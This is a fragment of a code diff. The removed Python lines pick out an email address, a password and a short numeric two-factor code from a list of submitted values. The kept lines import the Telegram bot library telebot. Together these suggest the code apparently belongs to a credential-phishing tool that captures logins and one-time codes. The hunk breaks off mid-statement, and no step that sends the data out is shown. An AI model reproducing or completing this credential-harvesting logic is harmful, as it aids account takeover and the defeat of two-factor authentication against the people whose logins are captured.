@@ -1,17 +1,4 @@
-        for i, val in enumerate(values):
-            if '@' in val and '.' in val:
-                email_idx = i
-                break
-        
-        if email_idx != -1:
-            user_val = values[email_idx]
-            for i, val in enumerate(values):
-                if i != email_idx and len(val) >= 4:
-                    if not pass_val:
-                        pass_val = val
-                    elif not twofa_val and len(val) <= 6 and val.isdigit():
-                        twofa_val = val
-            if not twofa_val:
+
 import telebot
 import os
 import json
